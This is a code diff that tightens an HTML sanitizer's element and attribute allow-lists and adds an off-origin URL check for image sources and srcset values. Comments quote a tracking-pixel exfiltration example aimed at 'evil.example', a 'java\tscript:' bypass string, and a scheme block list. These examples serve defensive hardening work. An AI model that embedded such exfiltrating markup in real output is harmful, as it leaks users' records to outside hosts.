@@ -165,8 +165,10 @@ export const REMOVED_ELEMENTS: ReadonlySet<string> = new Set([
   "script",
   "style",
   "template",
+  "textarea",
   "noscript",
   "noframes",
+  "noembed",
   "iframe",
   "object",
   "embed",
@@ -189,15 +191,31 @@ export const REMOVED_ELEMENTS: ReadonlySet<string> = new Set([
   "portal",
 ]);
 
-/** Attributes safe on any allowed element (plus `aria-*`, handled in `isSafeAttr`). */
+/**
+ * Attributes safe on any allowed element (plus most `aria-*`, handled in `isSafeAttr`).
+ *
+ * `role` is absent, and it is the one absence worth explaining. A record *is* a
+ * `<button>` — the platform's item wrapper — and opening it is the only thing it does, so
+ * the semantics of the whole item are the platform's and there is nothing left inside for a
+ * record to declare a role for. What a `role` could do is make the item lie: `role="button"`
+ * nests an ARIA button inside the real one, and `role="link"` announces a destination that
+ * does not exist.
+ */
 const GLOBAL_SAFE_ATTRS: ReadonlySet<string> = new Set([
   "title",
   "lang",
   "dir",
-  "role",
   "translate",
   "hidden",
 ]);
+
+/**
+ * The one `aria-*` attribute a record may not carry. Every other one describes the content
+ * to a reader; this one takes it away — a record could hide its own text from assistive
+ * technology while showing it on screen, which is the one thing the item wrapper's
+ * accessible name cannot make up for.
+ */
+const REMOVED_ARIA_ATTRS: ReadonlySet<string> = new Set(["aria-hidden"]);
 
 /**
  * Per-element attribute allow-list. Everything not listed here (and not global/`aria-*`,
@@ -246,7 +264,7 @@ export const URL_ATTRS: ReadonlySet<string> = new Set(["src", "srcset", "poster"
 /** Whether `name` is a keepable attribute on an allowed `tag` (lowercased inputs). */
 export function isSafeAttr(tag: string, name: string): boolean {
   if (GLOBAL_SAFE_ATTRS.has(name)) return true;
-  if (name.startsWith("aria-")) return true;
+  if (name.startsWith("aria-")) return !REMOVED_ARIA_ATTRS.has(name);
   return ELEMENT_ATTRS[tag]?.has(name) ?? false;
 }
 
@@ -255,13 +273,68 @@ export function isSafeAttr(tag: string, name: string): boolean {
  * C0 control characters and whitespace are stripped first so `java\tscript:` cannot
  * slip through; inline `data:image/*` stays allowed (legitimate for an image field),
  * while every other `data:` payload and the script schemes are rejected.
+ *
+ * This is the *scheme* half alone, and it is what the Handler-fragment scrub uses — a
+ * Handler composes the capability's own chrome and may legitimately point at an address.
+ * Item markup takes the stricter {@link isOffOriginUrl} below.
  */
 export function isDangerousUrl(value: string): boolean {
+  return urlCandidates(value).some(isDangerousUrlCandidate);
+}
+
+/**
+ * Whether a URL-attribute value in *item markup* is off-limits: a dangerous scheme, or any
+ * address that would make the browser fetch from somewhere else.
+ *
+ * A record may not reach off this origin. The `url(...)` ban in `style-discipline.ts` exists
+ * for exactly this reason — it loads a remote resource — and leaving `<img src>` open made
+ * that ban half a rule: a renderer emitting
+ * `<img src="https://evil.example/px.gif?d=…record fields…" width="1">` passed the
+ * design-lint rung clean and survived the enforcer byte-identically, exfiltrating every
+ * rendered record. The two surfaces could not both be right.
+ *
+ * What stays allowed is what a record legitimately holds: an inline `data:image/*`, and a
+ * same-origin path. A scheme of any kind and a protocol-relative `//host/…` are refused.
+ */
+export function isOffOriginUrl(value: string): boolean {
+  return urlCandidates(value).some(
+    (candidate) => isDangerousUrlCandidate(candidate) || isRemoteCandidate(candidate),
+  );
+}
+
+/**
+ * The addresses one attribute value names. `srcset` carries a comma-separated candidate
+ * list with density/width descriptors, so a check that read the whole value as one URL
+ * would see neither of the two addresses in `a.png 1x, https://evil.example/b.png 2x`.
+ */
+function urlCandidates(value: string): string[] {
+  const stripped = stripControls(value);
+  if (!stripped.includes(",")) return [stripped];
+  return stripped
+    .split(",")
+    .map((part) => part.trim().split(/\s+/, 1)[0] ?? "")
+    .filter((part) => part.length > 0);
+}
+
+/** Drop C0 controls and spaces, so `java\tscript:` reads as what a browser will read. */
+function stripControls(value: string): string {
   let stripped = "";
   for (const ch of value) {
-    if (ch.charCodeAt(0) > 0x20) stripped += ch; // drop C0 controls + spaces (java\tscript:)
+    if (ch.charCodeAt(0) > 0x20) stripped += ch;
   }
-  const v = stripped.toLowerCase();
+  return stripped;
+}
+
+function isDangerousUrlCandidate(candidate: string): boolean {
+  const v = candidate.toLowerCase();
   if (v.includes("javascript:") || v.includes("vbscript:")) return true;
   return v.startsWith("data:") && !v.startsWith("data:image/");
+}
+
+/** A scheme of any kind, or a protocol-relative authority — both leave this origin. */
+function isRemoteCandidate(candidate: string): boolean {
+  const v = candidate.toLowerCase();
+  if (v.startsWith("data:image/")) return false;
+  if (v.startsWith("//")) return true;
+  return /^[a-z][a-z0-9+.-]*:/.test(v);
 }
